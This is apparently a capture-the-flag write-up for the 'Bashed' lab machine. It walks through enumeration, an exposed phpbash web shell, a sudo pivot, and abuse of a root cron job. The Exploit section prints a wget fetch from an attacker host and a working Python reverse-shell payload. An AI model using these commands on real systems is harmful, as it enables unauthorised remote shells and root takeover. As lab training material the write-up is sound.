# Bashed

### Machine Info
![](screenshots/bashed.png)

#### Nmap

![](screenshots/nmap.png)

##### HTTP (Port 80)

Index page:
![](screenshots/index.png)


Click the phpbash and check `10.10.10.68/single.html` page:
![](screenshots/single.png)

I checked that `github` address and it is about `phpbash` and I just read the php code and usage:
![](screenshots/usage.png)


I feel like we there should be `phpbash.php` or `phpbash.min.php` in somewhere. Let's enumerate more by using `gobuster`:

![](screenshots/gobuster.png)

And from the `http://10.10.10.68/dev`, we can find those 2 `phpbash` files:
![](screenshots/dev.png)


Execute `phpbash.min.php` and get a low user shell:
![](screenshots/low_shell.png)

For better interactive, I just created reverse shell using:
![](screenshots/reverse.png)

`nc` listener on attacking side:
![](screenshots/reverse_shell.png)


#### Privilege Escalation

Before enumeration, just check for `sudo`:
![](screenshots/sudo.png)

User `www-data` can run any command with user `scriptmanager`. Let's get shell with user `scriptmanager`:

![](screenshots/scriptmanager.png)


And from the `/scripts` directory we can get two files:
![](screenshots/files.png)

But we can see that the file `test.txt` is owned by user `root` not `scriptmanager`. And moreover the file `test.txt` is changing every 1 minute:

![](screenshots/cronjob.png)


#### Exploit

Let's just replace that `test.py` with our malicious program and it will be executed by `root` privilege.

Simple Python Reverse Shell:</br>
Just create `test.py` and transfer to victim machine.
```
scriptmanager@bashed:/scripts$ mv test.py .test.py
scriptmanager@bashed:/scripts$ wget http://10.10.14.37:8080/test.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.37",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])    
```

And just wait for a minute and from `nc` listener:
![](screenshots/root_shell.png)

And you can get `root.txt` :)
